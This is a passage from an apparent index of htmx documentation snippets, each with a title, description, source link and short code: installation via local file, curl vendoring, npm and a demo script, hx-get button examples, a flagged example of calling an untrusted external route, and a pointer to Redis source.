information.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hateoas.md#_snippet_0\n\nLANGUAGE: txt\nCODE:\n```\nGET /accounts/12345 HTTP/1.1\nHost: bank.example.com\n```\n\n----------------------------------------\n\nTITLE: Calling an Untrusted Route with htmx in HTML\nDESCRIPTION: This HTML snippet demonstrates the potentially dangerous practice of calling an untrusted route using htmx. It triggers a GET request to an external domain, which can lead to security vulnerabilities if the external content contains malicious scripts. This is discouraged.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-get=\"https://google.com/search?q=events\">Search events</button>\n```\n\n----------------------------------------\n\nTITLE: htmx Installation via Local Copy\nDESCRIPTION: This code shows how to include htmx in an HTML page when you've downloaded a copy of `htmx.min.js` and placed it in your project's directory.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_5\n\nLANGUAGE: HTML\nCODE:\n```\n<script src=\"/path/to/htmx.min.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Downloading htmx Source using curl\nDESCRIPTION: This bash command downloads the minified version of htmx from GitHub and saves it to a specified directory.  The command uses curl to fetch the file from a specific URL and redirects the output to a local file. It assumes that the /js/vendor directory exists in the project.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/vendoring.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://raw.githubusercontent.com/bigskysoftware/htmx/refs/tags/v2.0.4/dist/htmx.min.js > /js/vendor/htmx-2.0.4.min.js\n```\n\n----------------------------------------\n\nTITLE: Including htmx demo script\nDESCRIPTION: This HTML snippet demonstrates how to include the htmx demo script in a project. The demo script installs htmx, hyperscript, and a request mocking library. This should only be used for demonstrations and is not guaranteed to work reliably in production environments.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_45\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://demo.htmx.org\"></script>\n```\n\n----------------------------------------\n\nTITLE: Installing htmx-1-compat via npm - Shell\nDESCRIPTION: This shell command shows how to install the htmx-1-compat extension using npm. This allows for integration with npm-based build systems.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/htmx-1-compat.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install htmx-ext-htmx-1-compat\n```\n\n----------------------------------------\n\nTITLE: htmx Button Example\nDESCRIPTION: This HTML snippet demonstrates how to use htmx to load content into an element. When the button is clicked, it sends a GET request to `/ajax/test.html` and loads the response into the element with the ID `result`. It requires the htmx library to function correctly.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/htmx-sucks.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-get=\"/ajax/test.html\"\n        hx-target=\"#result\">\n    Load\n</button>\n```\n\n----------------------------------------\n\nTITLE: Redis: kvstoreScan() Function Analysis (C)\nDESCRIPTION: This C function from Redis performs a scan operation on the key-value store.  It has around 40 lines of code, which is still larger than 'Clean Code' advocates, and demonstrates how real-world projects may deviate from strict coding standards while remaining successful.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/codin-dirty.md#_snippet_3\n\nLANGUAGE: c\nCODE:\n```\nRefer to: https://github.com/redis/redis/blob/3fcddfb61f903d7112da186cba8b1c93a99dc87f/src/kvstore.c#L359\n```"
  }
]